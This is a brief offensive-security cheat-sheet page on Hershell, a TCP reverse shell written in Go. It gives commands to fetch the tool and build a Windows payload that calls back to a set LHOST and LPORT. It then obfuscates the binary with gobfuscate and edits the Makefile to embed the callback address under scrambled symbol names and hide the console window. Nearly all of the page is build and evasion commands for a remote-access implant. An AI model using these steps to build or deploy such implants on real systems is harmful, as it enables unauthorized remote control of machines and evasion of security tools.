# Hershell

[Hershell](https://github.com/lesnuages/hershell) is a simple TCP reverse shell written in Go.

## Installing Hershell

```text
go get github.com/lesnuages/hershell
cd $GOPATH/src/github.com/lesnuages/hershell/
make depends
make windows64 LHOST=192.168.0.12 LPORT=1234
```

## Obfuscating  Hershell

[gobfuscate](https://github.com/unixpickle/gobfuscate) obfuscate Go binaries and packages.

```text
go get github.com/unixpickle/gobfuscate
gobfuscate -outdir github.com/lesnuages/hershell ./out
```

!!! warning
    You will have to set the `GOOS` and `GOARCH` before running **gobfuscate** since it's using the default build profile otherwise it will takes only the Linux source files.

The Makefile also needs to be copied and edited:

```text
LINUX_LDFLAGS=--ldflags "-X main.kephknbjcmclaiojcnoa=${LHOST}:${LPORT} -X main.eghlidmkekfibfjihlkg=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)"
WIN_LDFLAGS=--ldflags "-X main.kephknbjcmclaiojcnoa=${LHOST}:${LPORT} -X main.eghlidmkekfibfjihlkg=$$(openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2) -H=windowsgui"
```

